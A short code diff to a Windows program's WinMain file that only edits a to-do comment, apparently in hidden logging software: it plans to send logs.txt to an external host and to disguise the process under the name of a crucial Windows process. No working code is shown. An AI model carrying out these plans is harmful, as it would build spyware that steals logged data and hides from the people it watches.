@@ -74,5 +74,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 /*
     To-Do list
 
-    ~ idrk what to do now, maybe find a way to better hide it?
+    ~ consider writing some code to send logs.txt over the internet to an external host?
+
+    Ideas
+
+    ~ find a way to run the process under a spoofed name. Something similar to crucial windows process. 
 */
